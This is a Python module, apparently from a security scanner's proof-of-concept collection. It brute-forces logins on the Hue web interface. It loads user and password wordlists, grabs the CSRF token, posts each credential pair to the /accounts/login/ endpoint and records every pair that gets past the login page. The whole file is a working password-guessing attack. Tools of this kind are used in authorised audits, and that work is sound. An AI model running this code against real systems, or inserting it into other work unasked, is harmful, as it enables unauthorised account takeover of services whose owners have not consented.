# coding: utf-8
# @Time    : 2020/9/21 7:05
# @Author    : WANSUIYE
# @File    : hueCheck.py
# @Project: kscan_pocs

import requests

from .utils.getFile import get_var_items,genUserPasswd

def get_dict(flag=1):

	user_list = get_var_items('ssh_user.txt')
	passwd_list = get_var_items('top200passwd.txt')

	return genUserPasswd(user_list, passwd_list)

def bf(target,user,passwd,timeout):
	url = '{}://{}:{}/accounts/login/'.format(target[0], target[1], int(target[2]))
	retVal=''
	try:
		s = requests.session()
		s.get(url, verify=False, timeout=timeout)
		data = {'username': user, 'password': passwd, 'next': '/', 'csrfmiddlewaretoken': s.cookies.get('csrftoken')}
		res = s.post(url, data=data, verify=False, timeout=timeout)
		if res.status_code == 200 and 'login' not in res.url:
			retVal = '{}/{}'.format(user,passwd)
	except:
		pass
	return retVal

def check(target,**kwargs):
	timeout = kwargs.get('timeout') or 3
	flag = kwargs.get('flag') or 1
	retVal={'service':'Hue','status':1,'url':''}

	for user, passwd in get_dict(flag):
		res = bf(target,user,passwd,timeout)
		if res:
			retVal['status'] = 2
			retVal['url'] += res+'\n'

	return retVal
